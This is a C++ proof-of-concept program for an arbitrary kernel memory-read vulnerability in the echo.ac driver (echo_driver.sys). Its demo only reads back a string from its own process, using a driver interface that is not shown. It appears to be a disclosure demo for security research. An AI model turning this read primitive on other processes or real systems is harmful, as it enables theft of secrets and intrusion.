/*
 * I strongly recommend also reading the writeup for more info on the background of this company and exploit.
 * https://github.com/kite03/echoac-poc/blob/main/Writeup.md
 */

#include "DriverInterface.h"

int main() {
    std::cout << "echo_driver.sys PoC test." << std::endl;
    DriverInterface Driver; // Instantiate our driver

    std::cout << "This test demonstrates reading a string defined in this program, and then printing it." << std::endl;
    HANDLE processHandle = Driver.get_handle_for_pid(GetCurrentProcessId()); // Fetch HANDLE for ourselves.

    // Define the string we wish to read using the kernel
    const char* self_test_string = "This is a PoC of an arbitrary read vulnerability in the echo.ac driver.";

    // Call the read function
    const char* output = Driver.read_memory<const char*>(
            (void*)self_test_string, // Address to read from
            strlen(self_test_string), // Size to read
            processHandle // Handle
            );

    // Same string as above should be shown here, given to us by the Driver.
    std::cout << output << std::endl;

    // Close the handles.
    Driver.Shutdown();

    return 0;
}
